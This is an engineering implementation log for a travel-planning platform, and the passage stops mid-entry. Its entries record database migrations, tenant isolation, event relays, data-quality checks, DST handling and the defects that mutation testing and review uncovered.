# JourneyLab — Implementation Log

| Field | Value |
| --- | --- |
| Owner | Implementing engineer per entry |
| Status | `ACTIVE` — IMPL-001…055 recorded. The header said "no entries yet" until 2026-09-03, contradicting every entry beneath it; external review caught it |
| Cadence | One entry per sub-step, written in the same commit as the work |
| Last reviewed | 2026-08-05 |

Navigation: [Logs index](README.md) · [Bug register](BUG_REGISTER.md) · [Regression log](REGRESSION_LOG.md) · [Sub-step protocol](../02-delivery/SUB_STEP_PROTOCOL.md)

---

## Entry format

```markdown
## IMPL-NNN — STEP-NNN.MM — [Sub-step title]

| Field | Value |
| --- | --- |
| Date | YYYY-MM-DD |
| Author | |
| Requirements | REQ-… |
| Blast radius | BR-NNN (LOW/MEDIUM/HIGH/CRITICAL) |
| Commit | `<sha>` |
| Graph indexed commit | `<sha>` — matched HEAD? yes/no |

### What was built
Concrete description of the delivered behavior.

### Why this approach
The options considered and why this one. **If an obvious simpler approach was
rejected, say why** — this is the field future readers actually need.

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |

### Deviations from the step file
What differed from the plan, and why. If none, say "none".

### What surprised us
Anything that behaved differently from expectation. This is where the
expensive knowledge lives.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |

### Verification
| Check | Result |
| --- | --- |
| Sub-step tests | |
| Regression R1–R7 | see REGRESSION_LOG |
| detect_changes() scope | |
| Documentation updated | |
```

---

## Entries

## IMPL-059 — STEP-007.01 — The first product route, and the three defects it found

| Field | Value |
| --- | --- |
| Date | 2026-09-04 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-TRIP-002, REQ-EVID-006 |
| Blast radius | [BR-059](blast-radius/BR-059-coverage-api.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Closes | `BUG-028`, `BUG-029`, `BUG-030` |

### What was built

`apps/api/src/platform_api/coverage.py` — the first FastAPI-facing product handler in
the repository — with migrations `016` and `017`, a stdlib-shadowing guard, and
`guard:meta` finally wired into `verify`. Python 1281 → **1303**.

### Writing the handler found three defects in VERIFIED work

**`BUG-028`.** `API-017` is `security: []` — public, because putting coverage behind a
login means asking somebody to register to be told *no*. STEP-006.09 built the read
model tenant-scoped, so a public request had no tenant, RLS denied every row, and the
endpoint returned an empty region list. It does not error. "We support nowhere",
well-formed and plausible, to the person deciding whether to sign up.

**`BUG-029`.** `CoverageRegion` requires `display_name` and `date_bounds` and forbids
extra properties. The read model had neither and carried `accepting_trips`. The
projection was designed from what `EVT-008` can say; the contract was written from
what a traveller needs; nothing had compared them. My first handler papered over
`display_name` by echoing `region_id` — which validated against nothing and would have
rendered `bern` to a traveller.

**`BUG-030`.** R7 printed *"PASS — cross-tenant isolation enforced at the database"*
against a DSN pointing at a closed port, because the container fallback discarded the
declared DSN. Found by running `pnpm guard:meta` — which had never been run.

### Surprises

**A guard I wrote caught me one step later.** `platform/` shadows the stdlib, and
`apps/api/src` is on `pythonpath`. I caught it by importing before writing the
handler, wrote `no-stdlib-shadowing.sh` with a seeded-violation meta-test, wired it
into `verify` — and it immediately failed on `tests/platform`, which I had just
created, because `tests` is on `pythonpath` too.

**Declared and derived columns behave differently under rebuild.** `display_name` and
`date_bounds` are the product's statement and no event produces them, so a rebuild
must UPDATE the derived columns rather than DELETE and reinsert. Deleting is the
natural implementation and would erase every region's name — a projection that
rebuilds perfectly and a page that cannot render.

**Two of four surviving mutants were database constraints with no test behind them**,
for the third consecutive sub-step after STEP-006.08 and STEP-006.09. I keep writing
constraints and testing the layer above them.

**The honesty failure is the one worth keeping.** Twenty regression entries claimed
*"meta-suite 72/72"*. It had never run, the total is 74, and three were failing. What
found it was not diligence; it was adding an unrelated guard and running the suite to
check that guard. Recorded as a correction at the top of `REGRESSION_LOG`, and
`guard:meta` is in `verify` so the claim is now produced by running rather than by
typing.

---

## IMPL-058 — Sub-step records for STEP-007 … STEP-014

| Field | Value |
| --- | --- |
| Date | 2026-09-04 |
| Author | Deepesh Kumar Gupta |
| Requirements | Process — `SUB_STEP_PROTOCOL` |
| Blast radius | None — documentation only, no code, no schema, no contract |
| Commit | see git log for this entry |

### What was created

**63 sub-step records**, one per row declared in each parent's §21: STEP-007 (5),
STEP-008 (7), STEP-009 (8), STEP-010 (10), STEP-011 (5), STEP-012 (10), STEP-013 (10),
STEP-014 (8). Every declared sub-step now has a file, and every file is declared —
checked programmatically rather than by eye.

### `blast_radius_id: TBD`, and why that is a correction

The existing records pre-assigned a blast-radius number in frontmatter. **Every one of
them was wrong by execution time** — measured, not assumed:

| Sub-step | Pre-assigned | Actual |
| --- | --- | --- |
| STEP-005.07 | BR-036 | BR-046 |
| STEP-005.08 | BR-037 | BR-047 |
| STEP-006.01 | BR-040 | BR-050 |
| STEP-006.03 | BR-042 | BR-052 |

Every one off by exactly ten, because unplanned records (bug fixes, enhancements)
consume numbers the plan did not reserve. A number that is confidently wrong is worse
than an absent one, so these records say `TBD` and the pre-change table says why.

### What the records carry that a template would not

Each one names the specific failure it is guarding against, in its §13 hazard note,
drawn from what earlier steps already found. The recurring ones are pointed at
explicitly rather than restated:

- **The convenient clock hides the failure** — now in STEP-013.02's timeline hazard,
  because a DST day rendered as 24 hours shows slack that does not exist.
- **A metric with a degenerate strategy needs its counterpart** — STEP-009.08 and
  STEP-010.10 both, after entity resolution and drift found it twice.
- **A detector asserted only to pass is `return True`** — STEP-010.08's injection
  detector, where the consequence is that a green run becomes evidence no attack
  occurred.
- **Derived, not listed** — STEP-008.05's deletion traversal, where a hardcoded store
  list is stale the day after it is written and the failure is regulatory.

### Surprises

**Writing 63 hazard notes surfaced how much of the risk is already known.** Almost
none of them required inventing a new failure mode; they are the failures this
repository has already met, relocated to where they will next appear. That is an
argument for the logs being worth their cost, and it is also a warning: the same
mistakes are available again in every one of these sub-steps.

---

## IMPL-057 — STEP-006.09 — Replay and rebuild are opposites

| Field | Value |
| --- | --- |
| Date | 2026-09-03 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-010, REQ-EVID-006 |
| Blast radius | [BR-058](blast-radius/BR-058-read-models.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `8c501ce` — matched HEAD at pre-change |

### What was built

`services/events/src/projections.py` and `db/migrations/015_read_models.sql`: a
projection framework, the coverage read model, a rebuild that resets before folding,
and verification that compares rather than completes. Python 1258 → **1281**.
**STEP-006 closes at 9/9.**

### The inversion

`.07` spent its whole effort ensuring a replayed event does **not** re-apply its
effect. This needs the reverse: a rebuild re-applies every event into an empty
projection.

Route a rebuild through an idempotent consumer and every event is already in the
processed log, so all of them are skipped. **The rebuild succeeds and raises
nothing.** The read model is reconstructed from whatever was left, and the result
looks like missing data rather than a broken repair.

The two paths share an event stream and nothing else, and the reason they must not
share a mechanism is that their correctness conditions contradict each other.

### Surprises

**A checker that no test could distinguish from `return True`.**
`reads_only_its_arguments` was only ever asserted to pass, so replacing its entire
body with `True` killed no mutant. A one-sided assertion on a detector is worth
nothing — the same lesson as the axe negative control, and as `BR-029` §3. It now has
a seeded impure module it must reject.

**One survivor was an equivalent mutant of my own making**, for the second time in
three sub-steps: I filtered the log by `last_event_id`, which `rebuild` has just set
to `None`. A mutant that cannot change behaviour teaches nothing about the tests.

**The mutation restore failed for the third time in this step, and the diagnosis
finally landed.** `.01` and `.08` both cleaned up by guessing which org slugs the
tests had inserted; this one used a slug I had not guessed. Keying the cleanup on the
**table the constraint belongs to** is the version that cannot go stale. Three
occurrences to find a fix that was available at the first.

---

## IMPL-056 — STEP-006.08 — The vacuous pass, written into the module about vacuous passes

| Field | Value |
| --- | --- |
| Date | 2026-09-03 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-005, REQ-NFR-012 |
| Blast radius | [BR-057](blast-radius/BR-057-data-quality.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `7299ef1` — matched HEAD at pre-change |

### What was built

`data/quality/domain_expectations.yml`, `services/ingestion/src/quality.py` and
`db/migrations/014_data_quality.sql`: six expectation classes, a runner that refuses
to report a pass it did not earn, sigma-based drift, and a quarantine a curator can
query. Python 1231 → **1258**.

### Two defects found by external review, not by this suite

**Drift reported a pass without measuring drift.** `_distribution_drift` returned
`PASSED` whenever a `baseline_mean` field was merely present. The one check whose
entire job is noticing a distribution move could not notice a distribution moving —
and it sat in a module whose docstring opens with "a suite that ran nothing must not
report a pass".

Every test asserted the verdict for one input and none asserted that a *drifted*
batch produced a different one. Fourteen mutants passed over it, because no mutant
targets a function that already does nothing. Fixing it broke the "clean batch" test,
whose fixture had a baseline and no observation — it had been passing on exactly the
vacuousness that hid the defect.

**The quarantine reached nobody.** §5 requires "visible to curators, not just
logged", and `Quarantine` held entries in a list that lived for one batch run while
the table it was written against went untouched. Every test passed, because every
test exercised the class.

### Surprises

**I wrote the failure I was warning about, in the module warning about it.** The
distance between stating a principle and applying it is apparently not zero even when
the statement is three paragraphs above the code.

**Mutation testing did not catch either one**, and the reason is worth keeping: a
mutant proves a test notices a *change*. It cannot notice a function that was already
inert, or a persistence path that was never exercised. Both survivors it *did* find
were database constraints with no test behind them — the same blind spot from the
other end.

**The mutation restore failed exactly as it did in `.01`.** A mutant that permits a
write leaves rows that trip the constraint's own re-creation. I recorded that lesson
in `BR-050` §7 and did not carry it into this harness.

---

## IMPL-055 — STEP-006.07 — Pruning reopens the window the table exists to close

| Field | Value |
| --- | --- |
| Date | 2026-08-31 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-009 |
| Blast radius | [BR-056](blast-radius/BR-056-consumer-idempotency.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `04e8134` — matched HEAD at pre-change |

### What was built

`db/migrations/013_consumer_idempotency.sql` and `services/events/src/consumers.py`:
processed-event records keyed per consumer, a prune horizon that a replay refuses to
cross, per-key ordering with a deterministic tiebreak, and additive wire tolerance.
Python 1212 → **1231**.

### The constraint neither policy can see

The processed-event table grows forever, so it must be pruned. An event older than
the prune horizon has no record, so replaying it applies the effect again with nothing
left to stop it. **The prune horizon and the maximum replay depth are one constraint
wearing two names** — normally set by two different people, at two different times,
for two unrelated reasons: storage cost and operational recovery.

`replay` refuses to cross the horizon and names both dates in the refusal. Without
that, the replay succeeds and the duplicated effects appear downstream long
afterwards, with nothing connecting them back to a maintenance job that ran a month
earlier.

### The ordering that decides whether a retry ever happens

Record-then-effect and effect-then-record are both wrong alone, and they fail
differently: the first loses the effect permanently, because the record says it
already happened; the second duplicates it. **A duplicate is visible and a silent
omission is not**, so the record is written only after the handler returns — tested
with a handler that fails once and then succeeds.

### Surprises

**A naturally idempotent consumer is not just cheaper, it is unconstrained.** It keeps
no records, so the prune horizon does not apply to it and it can replay from any
point. That turned out to be the strongest practical argument for preferring
idempotent effects, and it only became visible once the horizon existed.

**The surviving mutant made "replay since yesterday" mean "replay everything".** Every
test had passed events inside the requested range only, so dropping the range filter
changed nothing observable — while in production it would turn a targeted recovery
into a full-history reprocess the operator never authorised.

**`consumer_prune_horizon` deliberately has no tenant column.** One consumer prunes
once across all tenants, so it is operational state rather than tenant data. Recorded
in `BR-056` §7 because a new table without `organization_id` should be a decision
somebody made, not something a reviewer has to notice.

---

## IMPL-054 — STEP-006.06 — A retry cap protects against poison, not against an outage

| Field | Value |
| --- | --- |
| Date | 2026-08-26 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-008, REQ-NFR-005, REQ-SEC-001 |
| Blast radius | [BR-055](blast-radius/BR-055-outbox.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `96670a8` — matched HEAD at pre-change |

### What was built

`db/migrations/012_outbox.sql` and `services/events/src/outbox.py`: the outbox table
with RLS and a relay-only role, a relay with capped backoff, an outage-aware
dead-letter policy, and lag measured from the fact rather than the attempt. Python
1185 → **1212**.

### The decision that shapes the module

The obvious relay counts attempts per message and dead-letters at five. Then the
broker goes down for twenty minutes: every message fails, every message burns its
attempts inside a couple of minutes of backoff, and **the whole backlog lands in the
dead-letter queue** — replayed by hand, ordering lost, after an outage that resolved
itself.

Poison and outage are indistinguishable one message at a time and need opposite
responses. So the dead-letter decision takes the **batch outcome**: nothing is
dead-lettered while nothing is getting through. A message becomes poison only once it
can be seen failing while its neighbours succeed — which is why the relay runs two
passes, since a single pass must decide the first message's fate before knowing
whether the second one works.

### Lag, and the convenient clock again

A relay that died an hour ago has zero time since its last attempt. That metric reads
healthiest exactly when it is most wrong, so lag is measured from `occurred_at` and
grows on its own with nothing running.

**Third occurrence of this shape**: freshness from ingestion time (`BUG-026`),
staleness stored rather than computed (`.08`), and now relay lag. The convenient
clock is the one that hides the failure, and it is convenient precisely because it is
the one the failing component still has.

### Surprises

**A test written four steps ago failed on purpose today.** `test_pending_vector_is_
still_absent[outbox / events]` had skipped since STEP-002.06 with its reason stated;
the moment migration `012` created the table it went red, demanding the real
isolation test it had been holding a place for. That construction — a placeholder
that detects its own dependency arriving — is the reason it was written that way, and
this is the first time one has fired.

Two real tests replaced it, and both were checked for detection power by weakening
the policy to `USING (true)` and confirming they fail. The write-side one matters
most: `WITH CHECK` rather than only `USING`, because a policy that filters reads and
permits writes lets one tenant inject an event into another's stream, where a
consumer processes it under that tenant's authority.

**The application has no `UPDATE` grant on the outbox.** A producer that can set
`status` can mark its own event published without sending it, and the relay would
never look at it again.

---

## IMPL-053 — STEP-006.05 — A guard no test could distinguish

| Field | Value |
| --- | --- |
| Date | 2026-08-24 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-007 |
| Blast radius | [BR-054](blast-radius/BR-054-normalizers.md) (LOW, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `e25056c` — matched HEAD at pre-change |

### What was built

`services/ingestion/src/normalizers/`: pure payload-to-canonical functions, provenance
stamping, batch normalization that keeps its refusals as data, and a schema version on
every record. Python 1163 → **1185**.

### Purity is a reproducibility requirement

`observed_at` is an argument, not `datetime.now()`. A backfill replay that stamps
every historical fact with today's date makes the whole corpus report as fresh — a
defect whose only symptom is that everything looks unusually healthy.

### Surprises

**My own docstring failed my own structural test.** The purity check began as a
substring search for `datetime.now`, and the module's docstring explains why
`datetime.now()` is forbidden. A text scan cannot tell code from prose *about* code.
Rewritten as an AST walk over `Call` nodes, which asks the question the test was
always trying to ask.

**A guard that no test could distinguish from its neighbour.** `normalize_place`
re-checked for naive timestamps, and the adapter behind it already refuses them with
its own test — so removing the duplicate killed no mutant. It is gone. This is the
inverse of the rule this project usually applies: a control believed to hold and
checked by nothing is the worst state, but a control checked twice by the same
assertion is a line pretending to be a defence. `CanonicalFact` keeps its own check,
because nothing sits behind that path.

**A mutant re-implemented the field mapping one function deeper and walked past the
test.** The structural check inspected `normalize_place` only; the delegation goes
through a helper. Now both hops are checked — a narrow structural test is a test of
the place you happened to look.

---

## IMPL-052 — STEP-006.04 — Binding happened; binding correctly did not

| Field | Value |
| --- | --- |
| Date | 2026-08-21 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-001, REQ-DATA-008 |
| Blast radius | [BR-053](blast-radius/BR-053-repositories.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `d869ad1` — matched HEAD at pre-change |

### What was built

`apps/api/src/domain/repositories.py`: a unit of work that binds the tenant on open,
refuses a second aggregate, writes queued events before `COMMIT`, and requires an
expected version on every update. Python 1143 → **1163**.

### The mutant that survived was the one that mattered

Twelve of thirteen died immediately. The survivor flipped `set_config(..., true)` to
`false`, which makes the binding **connection-scoped rather than transaction-scoped**
— a pooled connection then carries one tenant's context into the next tenant's
transaction. That is exactly the leak `test_tenant_isolation.sh` has tested at the
database since STEP-002.01, reintroduced one layer up.

My test asserted that `set_config` was called. **Binding happened; binding correctly
did not.** "The call is there" and "the call is right" are different assertions, and
only the mutation run distinguished them.

### Tenant binding as a precondition

A repository cannot be obtained outside an open unit of work, so there is no path to
the database that skips the binding. The database is deny-by-default underneath, so
forgetting yields *nothing found* rather than *everything found* — this layer exists
to turn that silent emptiness into a refusal, because an empty result looks like an
answer.

The tenant is deliberately **not** repeated in the `WHERE` clause. It would work, and
it would make every future query depend on remembering it — a second place to get the
same thing wrong. A mutant that adds the predicate is killed by a test asserting its
absence.

### Surprises

**Writing the outbox is this sub-step's job even though the table is `.06`'s.** The
atomicity is a property of whoever owns the transaction, not of the relay. Putting
the insert here means a rollback cannot leave a phantom event, and the test raises
inside the block to prove it.

**`ConcurrencyConflict` needed renaming.** Ruff's N818 wants an `Error` suffix, and
the convention is worth keeping even where the name reads better without it —
`.06`'s `CircuitOpenError` made the same trade.

---

## IMPL-051 — STEP-006.03 — What the type checker cannot catch

| Field | Value |
| --- | --- |
| Date | 2026-08-20 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-007, REQ-CONS-002, REQ-CONS-006, REQ-CONS-011 |
| Blast radius | [BR-052](blast-radius/BR-052-domain-entities.md) (LOW, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `d6318a2` — matched HEAD at pre-change |

### What was built

`apps/api/src/domain/models.py`: `Money`, `Provenance`, `TemporalValidity`,
`ScenarioLineage`, `Scenario`, `ItineraryItem`, `TripBrief`, `TripAggregate` and the
trip transition table. Python 1103 → **1143**.

### Illegal states, made unrepresentable where that is possible

`ScenarioLineage` is a separate required argument rather than four optional fields,
so `Scenario` cannot be built with three of them and repaired later. `REQ-CONS-006`
has no recovery point: a run whose inputs were never recorded is unreproducible
permanently, and there is no downstream check that can fix it.

### Infeasible is not Failed

The transition table encodes the two recovery paths `BACKEND_ARCHITECTURE` §3 draws:
infeasibility relaxes constraints and returns to the brief, failure retries and
returns to the evidence. Neither can reach the other's target, and an invalid
transition raises — telling a traveller "no plan fits your constraints" when a
provider timed out is a different product answer, not a cosmetic difference.

Two tests check the table rather than a transition: every state has a row, and
**every state can reach `ARCHIVED`**, because `REQ-PRIV-006` deletion runs from
there and a state that cannot get there is a trip nobody can delete.

### Surprises

**mypy is happy with `Money(True, "CHF")`.** `bool` is a subtype of `int`, so the
static checker accepts a flag where a price belongs. I added a `type: ignore` out of
habit and mypy told me it was unused — which is the finding, not the nuisance. The
ignore is gone and the test now records that the guard exists precisely because the
type system cannot express it.

**A shared rule is not shared coverage.** The surviving mutant was an out-of-range
confidence on `Provenance`. The places adapter has the identical guard *and a test
for it*, which is exactly what made the gap invisible — I had already seen that rule
tested, in a different class, in another module.

**A seed of zero is a seed.** Validating lineage with a falsy check would reject it
and the run would look unreproducible for a reason nobody could see from the error.
Tested explicitly.

---

## IMPL-050 — STEP-006.02 — The DST bug, found inside the module written to prevent it

| Field | Value |
| --- | --- |
| Date | 2026-08-20 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-007, REQ-EVID-002 |
| Blast radius | [BR-051](blast-radius/BR-051-temporal-model.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `e918c3b` — matched HEAD at pre-change |

### What was built

`apps/api/src/domain/temporal.py` — axis-named query builders and DST-safe
arithmetic — and `db/migrations/011_temporal.sql`, which adds a generated effective
range and a self-overlap exclusion constraint. Python 1080 → **1103**.

### The constraint that would have enforced a requirement violation

The obvious integrity rule is "no two facts about the same field of the same place
may have overlapping effective windows". It is wrong here: **`REQ-EVID-002` requires
conflicting evidence to stay visible**, and two sources disagreeing over the same
dates is exactly that evidence. The constraint would have rejected the second
source's fact with an error that reads like a data bug.

The defensible line is narrower — *one source must not contradict itself* — so
`source_id` is in the exclusion key and a test asserts two different sources may both
be stored.

### The bug, in the function whose job was preventing it

Python subtracts two aware datetimes sharing a `tzinfo` as **wall clock**. Documented,
and invisible: both offsets are correct. `b - a` across spring-forward returns 24
hours where UTC says 23.

The first draft of `elapsed_between` was `return end - start`. Every duration
crossing a DST boundary would have been wrong by an hour — **in the direction that
makes a tight itinerary look feasible**, since an hour that does not exist is handed
to the solver as slack. `is_dst_transition_day` had it too, which is why it called
the spring-forward day ordinary.

I found it by printing a value, not by a test. The function looked correct.

### Surprises

**I got the asymmetry wrong twice.** My first test asserted that `+ timedelta(days=1)`
moves 09:00 to 10:00. It does not — under `zoneinfo`, *addition* is wall-clock, so it
lands on 09:00 exactly like the helper. Only subtraction is the trap. The test now
pins that, and records that the equivalence is a `zoneinfo` property `pytz` does not
share, so the helper is not deleted as redundant later.

**A nullable column in an exclusion key is not in the key.** The first constraint used
`place_id WITH =`, and a NULL never conflicts because `NULL = NULL` is unknown — so
every region-level fact escaped it silently. The test written for the constraint is
what found it.

**Leftover rows from a failed test blocked the constraint's own re-creation** — the
same shape as the mutation-restore failure in `.01`, one sub-step later. A test that
fails partway leaves data, and the next `ALTER TABLE ... ADD CONSTRAINT` fails against
it with a message about the data rather than about the test.

**`__init__.py` was right here and wrong in STEP-005.05.** Every sibling under
`apps/api/src` is a package, so `domain/` needs one; the services roots are not, which
is why adding one there was the mistake. The rule is to match the tree you are in.

---

## IMPL-049 — STEP-006.01 — Immutable is not undeletable

| Field | Value |
| --- | --- |
| Date | 2026-08-18 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-007, REQ-SEC-001, REQ-CONS-006, REQ-PRIV-006, REQ-BOOK-002 |
| Blast radius | [BR-050](blast-radius/BR-050-core-schema.md) (**HIGH**, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `c346697` — matched HEAD at pre-change |

### What was built

`db/migrations/010_domain.sql`: fifteen tables covering DATA-003…016, thirteen RLS
policies, three immutability triggers, a segregated `booking` schema with its own
role, and lineage columns that make an unreproducible scenario unstorable. Python
1062 → **1080**.

### The distinction the design turns on

`TripBrief`, `EvidencePack` and `ScenarioVersion` reject `UPDATE` at the database,
because `REQ-CONS-006` makes a scenario reproducible from its inputs and an editable
input reduces "reproducible" to "reproduces whatever it says now".

**`DELETE` stays permitted.** `REQ-PRIV-006` requires deletion to traverse every
store, so a table that could not be deleted from would make the right to erasure
unimplementable — a privacy defect manufactured by a reproducibility control. Two
requirements that look opposed are satisfied by blocking exactly one verb, and a test
asserts the deletion half rather than only the refusal.

### Reproducibility as a NOT NULL

`scenarios` has four lineage columns — brief, pack, solver config, seed — and all
four are `NOT NULL`. `REQ-CONS-006` stops being something a write path must remember
and becomes something the database will not accept without. A parametrised test omits
each in turn.

### Surprises

**The mandated pre-change check has nothing to say about a migration.** Every `.sql`
file is one node in the graph — no tables, no columns, no policies — and
`app_current_org`, being a SQL function, returns `UNKNOWN`. For the change type this
step's own §20 calls low-reversibility, `REQ-KG-008`'s release gate confirms that the
file exists and nothing else. That is worse than `RISK-016`: a wrong number can be
cross-checked, but no answer at all is indistinguishable from a clean one. Logged as
`RISK-017`.

**Mutating the file proves nothing, so I mutated the database.** The migration is
`CREATE ... IF NOT EXISTS`; re-applying a mutated file leaves the schema untouched and
everything passes. Eleven mutants weaken the **deployed** schema — trigger dropped,
`UPDATE` granted, `FORCE` removed, policy widened to `USING (true)`, booking schema
opened, lineage made nullable, a `card_number` column added — and all eleven die.

**The restore step found its own defect, and only because I verified it.** A mutant
that lets a *write* through leaves the row behind, and the row blocks its own
restore: dropping the Null Island check let a `0,0` place be inserted, and re-adding
the constraint then failed against it. The run printed `11/11 killed` and `SCHEMA NOT
RESTORED` together. Without the final verification line it would have read as a clean
pass while leaving the database weakened — a mutation suite that damages the thing it
is testing and reports success.

**A derived check is only as complete as the schema in front of it.** `test_tenant_
isolation.sh` derives its FORCE-RLS assertion from the catalogue precisely so new
tables are covered automatically. But it applied only migrations 001 and 003, so on a
standalone run the thirteen new tables would not exist and the assertion would pass
having checked tables that were not there. Derivation removes the stale-list risk, not
the incomplete-schema risk.

---

## IMPL-048 — STEP-005.10 — Health that is visible without being nameable

| Field | Value |
| --- | --- |
| Date | 2026-08-18 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-EVID-006, REQ-TRIP-002 |
| Blast radius | [BR-049](blast-radius/BR-049-provider-health.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `2411165` — matched HEAD at pre-change |

### What was built

`services/ingestion/src/provider_health.py`: a four-state health machine with
recovery hysteresis, `EVT-008` emission on published-state change, a coverage model
that refuses trips in uncovered regions, and a public projection with nowhere to put
a provider's name. Python 1036 → **1062**. **STEP-005 is complete at 10/10.**

### Two requirements that look opposed

`REQ-EVID-006` requires degradation to be surfaced rather than masked by cached data
presented as current. The `Coverage` contract requires the opposite of detail: *"an
aggregate. Never a list, never named, never a count — each of those leaks the shape
of the supply chain."*

Both hold, because they are about different things. The traveller learns **that** the
answer is degraded and never **who** degraded it. `PublicRegion` and `PublicCoverage`
have no field for a provider, a count or a quota — the same construction as `.06`'s
attribution record, where the field a leak would need does not exist. A count alone
reveals the supply chain's size, and quota proximity tells an attacker precisely when
the product degrades.

### Four internal states, three published

§5 asks for four; `EVT-008`'s enum has three and is closed. The internal machine
describes our mechanics, the event tells a consumer what it can do, and no consumer
responds differently to "circuit open" than to "unavailable". `RECOVERING` maps to
`degraded` rather than `healthy`, because publishing recovery on the strength of one
probe sends full traffic back to a half-recovered provider.

### Surprises

**Writing a test for the mapping found that I had misunderstood my own design.** The
first version used `DEGRADED → CIRCUIT_OPEN → RECOVERING` and failed, because that
path crosses `unavailable → degraded` and does publish an event. Working out why
exposed the real structure: **the four-to-three mapping collapses at exactly one
adjacency**, `RECOVERING → DEGRADED`, when a provider starts answering and then fails
again without tripping the breaker. Every other transition crosses a published
boundary. That single case is the flap, it is the only one the design needed, and my
test had been written for a case that cannot occur.

**A mutant survived that was my own equivalent mutant.** "Degradation accepted with
no disclosure" seeded as `disclosures=() or (...)` — which still evaluates to a
non-empty tuple, so nothing was mutated. Re-seeded as `disclosures=()` it dies
immediately. It also exposed a weak assertion: the test only checked the tuple was
non-empty, so a disclosure saying nothing would pass. A second mutant now checks the
text actually reports degradation.

**Hysteresis is a traveller-facing property, not an operational one.** The obvious
argument for it is event-storm suppression. The real one is that a flapping provider
makes coverage accept and refuse at random — and an intermittent refusal is worse for
a traveller than a steady one, because it is not reproducible. They retry, it works,
they retry later, it does not, and nothing they can see explains the difference.

---

## IMPL-047 — STEP-005.09 — Reconciliation that says what it did not check

| Field | Value |
| --- | --- |
| Date | 2026-08-18 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-002 |
| Blast radius | [BR-048](blast-radius/BR-048-reconciliation.md) (LOW, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `77f5abf` — matched HEAD at pre-change |

### What was built

`services/ingestion/src/reconciliation.py`: count and identity-digest reconciliation,
an explicit `Unreconciled` verdict, a replay-safe cancellable backfill runner built
on the framework's `ResumableRun`, and an append-only evidence log. Python 1011 →
**1036**.

### Three ways a completeness check reports success while being wrong

**A count match is weak evidence.** A hundred against a hundred proves a hundred of
something arrived. One dropped and one duplicated reconciles exactly. Both methods
are implemented and the weaker one carries its limitation as data —
`detects_substitution` is `False` and the detail says so — because a verdict that
overstates what it checked retires the suspicion that would have led someone to look
properly.

**"No count endpoint" is not a pass.** Treating it as one makes every unverifiable
provider report perfect completeness forever, and the dashboard is cleanest exactly
where the evidence is weakest. `Unreconciled` is the honest value.

**A tolerance band hides a slow leak.** Under one percent, pass — and the gap widens
for a year without ever crossing the line in a single step. So every discrepancy is
recorded whatever its size and the threshold decides only loudness. A test seeds four
runs at 0%, 0.2%, 0.4% and 0.6%: none alert, all are recorded, and the trend is
obvious in the series and invisible anywhere else.

### Surprises

**The fourth module to need the same shape.** `Unreconciled` sits beside
`ProfileUnsupported`, `TransitUnavailable` and `ObjectiveWithdrawn` — four sub-steps
independently arriving at "a value meaning *we could not answer this*, carried where
it can be seen". At four occurrences it is the house pattern rather than four
decisions, and worth naming as one.

**The surviving mutant lived at the seam between two modules.** Passing
`handled=len(identities)` instead of `len(fresh)` breaks nothing here — `reconcile`
reads the applied identities, not the checkpoint — so all 24 tests passed. What it
corrupts is `Checkpoint.records_seen` in the *other* module, a field the framework
added, in its own words, "so a resume that re-delivers a batch is visible in the
numbers rather than only in theory". Inflated with duplicates, three fresh records
and three replays report the same number.

My tests covered this module; the framework's tests covered that one. **Nothing
asserted on what this module writes through the seam into the other's state**, and
that is where the defect lived. The fix asserts on the stored checkpoint rather than
on the runner's own counters.

**Re-delivery is the normal path, not the disaster path.** The framework commits
after handling, so a crash in between replays the batch — the correct trade, because
the alternative loses records and only one of the two is detectable. It means replay
safety has to hold in ordinary operation, which is why the test replays a batch
instead of asserting idempotence in a docstring.

---

## IMPL-046 — STEP-005.08 — Freshness measured from the source's clock, not ours

| Field | Value |
| --- | --- |
| Date | 2026-08-18 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-005, REQ-EVID-005 |
| Blast radius | [BR-047](blast-radius/BR-047-freshness-policy.md) (LOW, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `a7a5a04` — matched HEAD at pre-change |

### What was built

`services/ingestion/src/freshness.py`: a field-class registry with per-class
thresholds and severities, age-at-use computed from observation time, an
applicability check independent of freshness, and a verdict that either blocks the
option or marks the fact. Python 985 → **1011**.

### The failure that is invisible if you measure from the wrong clock

Fetch a value at 09:00 that the provider last refreshed three days ago. Measured
from ingestion it is zero seconds old and every dashboard is green.

The reason that is dangerous rather than merely wrong: **the staler the upstream
cache gets, the fresher our numbers look**, because each re-fetch resets the clock
we chose to read. Polling more often improves the reported freshness and changes the
data not at all. A provider quietly serving three-day-old cache is precisely what a
freshness policy is for, and ingestion time makes it structurally undetectable.

Both timestamps are carried anyway. With only `observed_at` the mistake would be
